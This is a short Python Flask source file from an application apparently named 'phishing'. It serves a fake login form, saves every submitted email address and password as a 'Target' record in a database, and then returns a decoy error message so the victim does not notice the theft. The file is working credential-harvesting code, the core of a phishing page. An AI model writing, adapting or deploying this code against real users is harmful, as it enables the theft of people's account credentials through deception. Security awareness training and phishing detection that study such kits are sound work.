from flask import Blueprint, render_template, url_for, redirect

from phishing import app, db
from .forms import FakeLoginForm
from ..backend.models import Target

# Register frontend blueprint
frontend = Blueprint('frontend', __name__)

# Frontend blueprints

@frontend.route('/', methods=['POST', 'GET'])
def home_frontend():
    form = FakeLoginForm()

    if form.validate_on_submit():
        new_target = Target(
            email = form.email.data,
            password = form.password.data
        )
        db.session.add(new_target)
        db.session.commit()

        return "Oh nooo something went wrong... 👀"
        

    return render_template('/frontend/index.html', form = form)